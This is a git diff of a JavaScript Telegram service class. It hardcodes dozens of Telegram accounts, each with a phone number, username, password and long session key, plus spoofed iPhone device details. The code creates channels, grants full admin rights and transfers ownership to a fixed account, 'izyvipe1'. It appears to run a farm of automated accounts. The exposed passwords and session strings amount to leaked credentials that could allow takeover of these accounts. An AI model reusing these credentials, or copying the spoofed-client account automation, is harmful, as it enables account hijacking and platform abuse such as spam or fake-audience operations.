@@ -12,58 +12,6 @@ class TelegramService {
       {
         api_id: '8',
         api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '16.0.3',
-        app_version: '8.9.1 (23989) ',
-        device_model: 'iPhone 12 Pro',
-        tg_id: '5966637445',
-        phone: '6281267493831',
-        username: 'afijoqisyk6',
-        last_time: '1674150350',
-        password: 'afijoqisyk6_5966637445',
-        key: '1BVtsOIYBu1SBP01JRO3DCFY5pjoXETgcx7ioCH3eAOToYWr_pTZgv2YVfIV4hwXdMyE4ZVL-L19ua7vMAtKHS1l4fjX618GIoY4Taj15nEvEHALo7JB9cy8jNRQSkO-neOSX63I4fVLtym5DqWVBSD9Y2HtFlahN8KokX6JuQPDGdVfP00pgd5Ozm5XgEZH6gUT_U5KPOAquk1SeWLrsrAMF8enyeMtrZtz4dHCOpW2uzKWgzO8datKfqUbdBx_EBrfFP-gz6hMjzYXG5x2UjVfLQ8NCfpOwDWFhT8zUNHwHqxJxN9jL1gZeOu8RR5Qo97tRzoGa_47gOt9JsAkLSuBgtruoG6s=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '15.3',
-        app_version: '8.9.1 (23989) ',
-        device_model: 'iPhone 11 Pro',
-        tg_id: '5989581909',
-        phone: '62895327513130',
-        username: 'gapopeg10',
-        last_time: '1674150350',
-        password: 'gapopeg10_5989581909',
-        key: '1BVtsOIYBuwLUpYCqq0_G-lzl09Jm5igP6T3Jl62sT6SMtvcJZOr129waJQPuv8h-35U3USQ0W5A2Uef4A8B2I8ZavZ6hSi3WnHBsSnabEDjHfU706wfNVmf3yu6eyesaevhu0ko0aBV9BuPBcHQ3NgtDLaXPvZ-oqEIAhSnnFfF2aT7h2cATCrAkicdI_nGYnkb4ceVMAnZkuXOnm5MGwj8a0MACjif66ZOPx5UWu4KxCRt3cym0DRU5VpOqpUPIQUubqpb89dgTX9rq2SE6M-nYf0au3q7fTvnaJL6RXR_ZJh2jQ-6BKJVIYjYUEKVpfRw7pAMU1QB4kVppgNTSukAPgI0RnpU=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '16.0.2',
-        app_version: '8.9.1 (23989) ',
-        device_model: 'iPhone X',
-        tg_id: '5871143287',
-        phone: '6281267493874',
-        username: 'udymoqyfesh5',
-        last_time: '1674150350',
-        password: 'udymoqyfesh5_5871143287',
-        key: '1BVtsOIYBuxRqhszed5K5ljlqmdzoWLwEL6HSQES1kPUHbZ3WNfUwJF7bqxfTosyNxZ9xPF7sPOsXYMlU8MzK50EUZE6GePCZANl94gt-rJZw3ZTzD24trC7r-vMeuTwc7lP4TUcF0-bH-bpTWGIH0kh9kxg6w1twIpwkmO-eJ5Hh5VPeyHiJJ4Fe8dG_GnnnIFwURI82r9ov9dBL6ANkkSw6z72pzBf6_gnKZqDxjjAwRsOsBALKwz2iXMc86CFIMNejdh0tpCd5nlzBFVve3ZmVnlYFw8E88ZhpgqcmbQ-SsW-ALGSEs7MXMYiVUwCburW3U8jZs_ynwETSQdO60tbucIe-P3E=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '16.0',
-        app_version: '9.0.2 (24217) ',
-        device_model: 'iPhone 12 Pro Max',
-        tg_id: '5913876689',
-        phone: '62895327513724',
-        username: 'etysetiv7',
-        last_time: '1674150350',
-        password: 'etysetiv7_5913876689',
-        key: '1BVtsOIYBu2H9likG2FL75RuOhtlgfLwnt7tnrRN0286DSACzpJw1gHNU5BggHqmfqpUW1NtUSK-4AGEDbxwx9RhIRR_jZarD74rL5O3ev3keP1LlXz9pKBTizTS2_u-uTsHRsh94_BBuH5K3n0xFmJDksi9p6TpQELuTVCVGO-mpTCTc8buzmbCrjldsYIND39I_Ffm-gVNIaazeezbMqp4zdiNtfAjHnFl3iCyDrD196M7DAJAnrU2spFgQiYKKntWLq_eLzvt0SM400Qzs59XFUvEOoncIh8mxHZOE3TcAjbmUAG9uGfCM6cSjQ3onwveUCePwSomEIfq2TXqXYuqCRG9O-0g=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
         system_version: '15.3',
         app_version: '8.9.1 (23989) ',
         device_model: 'iPhone 11 Pro Max',
@@ -529,136 +477,6 @@ class TelegramService {
         password: 'uchirani8_5907835805',
         key: '1BVtsOIYBu3Mp99-KSp09DI-tQpJwmgYWtOhwK-DuIvyCcq83EZgPI2o7sh4LUtPzdQTKwQdZtOg6TpA0OXny24oKCLdH5X26HiHTB2UyqRHPzBZPBJ8YhoxitUz0fy31sKLoXRth-4klS4WmG4wVXDqLWJMeYo4u2qo71EF165bOrHYWyaE-i59wjMXJcvHaaLVNchuUQewnOYkBLk0LSK7TWcPuaLUZsTIrDwVktZ4y3CL7MKGwxYcF9xu6507J1QMMzNFCWT5XENhmCd8_uPTmgEyFrJTXzYUjUKHqcBzFrexSNrs-DRXK1pZdFUoewCftVYmgTKrafHW4Tf2hKu-Oz8FSbFQ=',
       },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '16.0',
-        app_version: '9.1.0 (24428) ',
-        device_model: 'iPhone 12 Pro Max',
-        tg_id: '5691040057',
-        phone: '6281389285246',
-        username: 'izyvipe1',
-        last_time: '1674150350',
-        password: 'izyvipe1_5691040057',
-        key: '1BVtsOIYBu1TTc70L4HHMuON1EHUqRy5pHIQEivtZ2wF-rGKCp5pShkMDBrBmSlSdGOTnT5EjHZhnBxlCAbN7VfLuts00LXlvJyfl6HinoRRl0D5fqgycHWHpEbX0UoeuVM5pdpanAA7mRlOZfZ1kvHWwtCULCDAUT5Y0_zaXMhcqwMB3-HUZJrgXwqdBo_4mp_uAHEczm1Tft53aHukayr8EpCzByjqQHMaKMo7PSQmxU-yGt6Z_BM2xJda9IZ-FQTwjIbWbQwl4yA9kliVhA9xC5Y0ii3-aoqYQkUwnaOYU4EEIqYWE3vc46Lr3gFD1RldY1Q3bFGCds3fCvyyqIb8zpJ-SewE=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '15.3.1',
-        app_version: '9.0.1 (24209) ',
-        device_model: 'iPhone 12 Pro',
-        tg_id: '5768732135',
-        phone: '6281389283889',
-        username: 'xoshoxemoh6',
-        last_time: '1674150350',
-        password: 'xoshoxemoh6_5768732135',
-        key: '1BVtsOIYBu476gcqz_CkmUjazaL5FS-D-kqK5ANBUqZgLUNDMWUWuXXaIBHnU15Xmviw_8WjPCSGjE1NMm3CWf-bh_ixfGgY-n9gZuu5NCy0FPDBq4GKZ4wRfaWb4kYvyIdCjDEcLWmTjfWgaIdYaRru49rANQgsIKa26LHzLkjeNgzRDRgoG3uT_s54tvJnDg8T2qs07j9sNMOsX5oVFcuvfwVHbBkkgdvrV-8Q0NVG_dtInjxuWMQzLNp-zrAuCe4cj-AjnCB0qfOt1A_Y7l1a9eSVQizKg1rgJJm5JHOXdIAUXRFfsFqcrfMVm-yQGtgWWgCEwwBVrm7YRc8JaKRxo2iov_Lc=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '16.0.3',
-        app_version: '8.9.1 (23989) ',
-        device_model: 'iPhone 11',
-        tg_id: '5554895924',
-        phone: '6281292021842',
-        username: 'chatuchaqi4',
-        last_time: '1674150350',
-        password: 'chatuchaqi4_5554895924',
-        key: '1BVtsOIYBu4CwZ4FYrgFtXIeDJvLD_O6zTW5Z1VD6FJOsI6Usb2XYryWTRveMb3YgyR9laMIc-9fr6rnQGVeN4WZ8jctSCcPC6p-elrgDvNbN6JzgMdkuKSq2c2MinEcqbIxvHg4BlFhbX1c-5vPnLdDG9Cj47UQvXgwVY5xoM65I9sEzIfMBdhaLF2hTfkas-2Ha-9Y4jyB8h4bQEq2Gi1vuuoLOhlSiudhfWyESSqmNe4gs0qvPsXOfzS17XucK4qmr0USeM4aN90xYDIcAto2b7Kw1jcyKB8A7FaK_Tcl6Ds3ExCvyct6ufdgAd7VSCv3ixZVh8zqvVh5j9blqjVgiQSR4z3c=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '15.3.1',
-        app_version: '9.0.2 (24217) ',
-        device_model: 'iPhone 11 Pro Max',
-        tg_id: '5828016432',
-        phone: '6281389284631',
-        username: 'thogodyt1',
-        last_time: '1674150350',
-        password: 'thogodyt1_5828016432',
-        key: '1BVtsOIYBu5C2z7aFwo7FBKhCfoFyLUjt3By8Ok2sPoJxpSvczZQUBiSJ3ZbYg_BZ0ffGmryZqRzUmEtHlxO7SfjsptjgbaN7rYxHeJNNJil_ceiYmYcjKEbuyt1_oXbLk7s3LjpGS-uJmkR4j1pE0AFI8d2Hjq61vhwGevrwvJ9DZIUk15rYnpaNAc0jJOj8CfjhW5JWnFh-zHg0aIcmvaRcI5Q1JTp9eoqPT-EbRSMZEzyx6-b--l1yM7TbMYhhp_5m1m9xFWPOzcAynyMGRCZSVevYwl0vYU134H1dsSP64iOZqlaFD_-kaKMoQdeyyT0axXQgBgCCwZtEJHPCNRlTf-aY38A=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '15.3.1',
-        app_version: '8.9.1 (23989) ',
-        device_model: 'iPhone 12 Pro',
-        tg_id: '5951184723',
-        phone: '6281389285089',
-        username: 'acenykhu6',
-        last_time: '1674150350',
-        password: 'acenykhu6_5951184723',
-        key: '1BVtsOIYBuxnBw7zhlJpyj-7DoRst12I05FMIiDu7WsV94wD7BKFtmz5L5bUNbsljcfhQEJeYg-ZYloFfd3C6-hMks7hEuCqdkuJpilwiNt9vZoVAl6MH1zbXEaCTBudqg_Qzp-07cdtWnz-u4wO9ylW6zoPHH2RrqI_lPQZBLxCrmBGzkKEfUNBZNaAtUpFWlyO1Mdb3ViQxF6818UyimF8uc0O7o3WltqIY02OFyH1l-btRkxwvz0YHHpeIUqP2Rv3kc6S2ae8cbgGDJHUeoIiJAoMfBrJsDw0nlizPWbMX28komh9xUeQ5rOBsBtBguuG_6W95-LZgKBRjNsE2l08r_2kks9M=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '16.0.2',
-        app_version: '8.9.1 (23989) ',
-        device_model: 'iPhone 12 Pro',
-        tg_id: '5941148505',
-        phone: '6282127213137',
-        username: 'zusikhiv5',
-        last_time: '1674150350',
-        password: 'zusikhiv5_5941148505',
-        key: '1BVtsOIYBu3Ik4jG2U2BwSx5okA03EGqtY4_ic7Etn29QNyszHSUPQqAry0t4fVIRu18EC-EcDrhrc-s70ArWOJtsjciS9QZq3319IsKnPP713S0oWCVEYpzOwy-Astd9S3tjoYxYUzf4WXsGcfWWuzOsNMd9VXL8991gHPAGYv2EGBPnVAgHJdkOMlQrEGAFvafj57gUgDshxvnWX4o5w5y7SmVGvWU3SrDLcCl3suHBoR5KDfh3_0kkkEFoK3as8CPVyRC7Bs8zzmQ6H-4Nq761H-5kT0KMXuZ52ZI4y0L3uE4wc3OXRLmwxllHfj2dw0Df21rXpYQHMoGNqSB9EHu_Iokzh6U=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '16.0',
-        app_version: '9.0.1 (24209) ',
-        device_model: 'iPhone 13 Pro Max',
-        tg_id: '5849273596',
-        phone: '6282136464352',
-        username: 'efokutho2',
-        last_time: '1674150350',
-        password: 'efokutho2_5849273596',
-        key: '1BVtsOIYBu5hrborbPdhdZy0gB-wja2y5qKXXo5dMDlwgf5Xd8vH89kUmAXrYCv56GGhyWClNvBffWTxXonyZuS_ZqtShIg-980IzDk_I_wt7A2K3MwIgz6tT4NfUlRuo7RQfEm9jfKPuRy6piPu_mc5e3yb6CZMxc4pR_zjPYx6kYyXflxzmfHkmWEQrW34sZ8fvHvyOzj4rffouKXWewdYHF0vjhqhQ8l8f5wXX-XGgks95b9_xkX1jl-VQ0rho3wxh7dYwapJqTxZVsBj9UYGFjrda_Cylb15nNzmN58kDOXKhyD0iqZSe7IUY7fyYSG-UMyBV7XkMab6zOrWVuzvLqshFm-Y=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '16.0.2',
-        app_version: '9.0.1 (24209) ',
-        device_model: 'iPhone 12',
-        tg_id: '5811205933',
-        phone: '6281389284740',
-        username: 'ivubyca6',
-        last_time: '1674150350',
-        password: 'ivubyca6_5811205933',
-        key: '1BVtsOIYBu4vpjzRZXUT4VQfbOB2hxmkOXfVKEIYCYcevz5JQX9CGkJvIBdDfdgDx0HXhzOcazcGwNtMBMrz1vNumHpKqh0IML8YPX9mgXK2dPxwD7-6yh84zhjDc4xgh2JUfpVXymefuAduYSQON7ESHpIrkp9ep5oaz5DryHoZqZMMiE4GwlTzCicypst59javha6uuDNpKBHTSaTwVDlFTbgsjN63zjKOHTdMSKLQ7oByTrJt3OumNxB5f9l5qxdhwRp_i5DC5UIxjI6lG9d4-yY4H81VZODgP_pMx6rEDcsSkKBySW98SAYIcs6Vs5IaHlmc6zYODqk11bKDbink-Qu1FdWI=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '15.3',
-        app_version: '9.1.0 (24428) ',
-        device_model: 'iPhone 13 Pro',
-        tg_id: '5942628374',
-        phone: '6281389284727',
-        username: 'xijiditoqi6',
-        last_time: '1674150350',
-        password: 'xijiditoqi6_5942628374',
-        key: '1BVtsOIYBuy6COBOnZZRr58zd3vFxEgZLtwXpNCX0kHU4dCMz4CbtcOP1xTkhswm4gEy8d8EzF0SoMPBU7A5Lm5bvhP9IWtx0heXSSJuJGrOqs0jpJSI-LEyWcrkSqHB0dg9jt8UVRoIQ-Dq6IVRO8x_G8bZws2Qt4B1H-kCyngLBmeuI3KJylpjezhmoiUuRqxBufGRE83y_trH3ajwPEzFZ3hDI1Ifyu_dTSS-a0zJNRaZuJWASn9WAAbOj9Rs_D2SPDjqa5cgLcCAEmp3GObWUat26aAOxkqIZ3n_jDulUu0Jb_HFOp1lCLkL0aPONL9HBEHFVDRA3-Hyl6z1xoDXPIe9i4PY=',
-      },
-      {
-        api_id: '8',
-        api_hash: '7245de8e747a0d6fbe11f7cc14fcc0bb',
-        system_version: '15.3',
-        app_version: '8.9.1 (23989) ',
-        device_model: 'iPhone 13',
-        tg_id: '5933818453',
-        phone: '6281389284704',
-        username: 'shazyvysh6',
-        last_time: '1674150350',
-        password: 'shazyvysh6_5933818453',
-        key: '1BVtsOIYBuzgQHZbv3uXx-_MxoiCrHOKzBGT5KxgMdtbZdisIYifhsHgsmavxwPN5WJgttf9fjkc2tbx9wqSuAZwO00JICVgoW1kpiglMKJ5jgVHtYq_UsN0KEkwGoO8imRZVAus_bSn4GZvn-nz9NR27sz2NU8is5ugYaiZN4t2pRwikpn7g6SyWAm4uOX_XvTeuNV82GvL7GzYQrtBC8CynbK6I5MURAJzoTxAjE4PVkOa43iG2zx8UsXaFs-U1F35mMYjCf5m6eOoa8SoTtreCVuWnDha0nxsrpjsQyxc71tYrAArpfyCaAoYlRQsXBEA0WzKm3w2M9yH-ZAT4TkxTXxgnVqU=',
-      },
     ];
     this.currentSession = [{}, {}, {}, {}, {}];
   }
@@ -676,33 +494,34 @@ class TelegramService {
         })
       );
       const chat = await telegram.getEntity(result.chats[0]);
-      for (const { tlg_login } of invite_users) {
-        try {
-          const result = await telegram.invoke(
-            new Api.channels.EditAdmin({
-              channel: chat,
-              userId: tlg_login,
-              adminRights: new Api.ChatAdminRights({
-                changeInfo: true,
-                postMessages: true,
-                editMessages: true,
-                deleteMessages: true,
-                banUsers: true,
-                inviteUsers: true,
-                pinMessages: true,
-                addAdmins: true,
-                anonymous: false,
-                manageCall: true,
-                other: true,
-              }),
-              rank: 'Admin',
-            })
-          );
-        } catch (e) {
-          console.log(e);
-          continue;
-        }
+
+      // for (const { tlg_login, tlg_user_id } of invite_users) {
+      try {
+        const result = await telegram.invoke(
+          new Api.channels.EditAdmin({
+            channel: chat,
+            userId: 'izyvipe1',
+            adminRights: new Api.ChatAdminRights({
+              changeInfo: true,
+              postMessages: true,
+              editMessages: true,
+              deleteMessages: true,
+              banUsers: true,
+              inviteUsers: true,
+              pinMessages: true,
+              addAdmins: true,
+              anonymous: false,
+              manageCall: true,
+              other: true,
+            }),
+            rank: 'Admin',
+          })
+        );
+      } catch (e) {
+        console.log(e);
+        // continue;
       }
+      // }
       const res = await telegram.invoke(
         new Api.messages.ExportChatInvite({
           peer: chat.id,
@@ -714,19 +533,20 @@ class TelegramService {
       const your_password = this.currentSession[index].password;
       const passSrp = await computeCheck(pwd, your_password);
       try {
-        for (const { tlg_login, owner } of invite_users) {
-          if (owner) {
-            await telegram.invoke(
-              new Api.channels.EditCreator({
-                channel: chat,
-                userId: tlg_login,
-                password: passSrp,
-              })
-            );
-          }
-        }
+        // for (const { tlg_login, owner } of invite_users) {
+        // if (owner) {
+        await telegram.invoke(
+          new Api.channels.EditCreator({
+            channel: chat,
+            userId: 'izyvipe1',
+            password: passSrp,
+          })
+        );
+        // }
+        // }
       } catch (e) {
         console.log(e);
+        return;
       }
 
       await telegram.invoke(
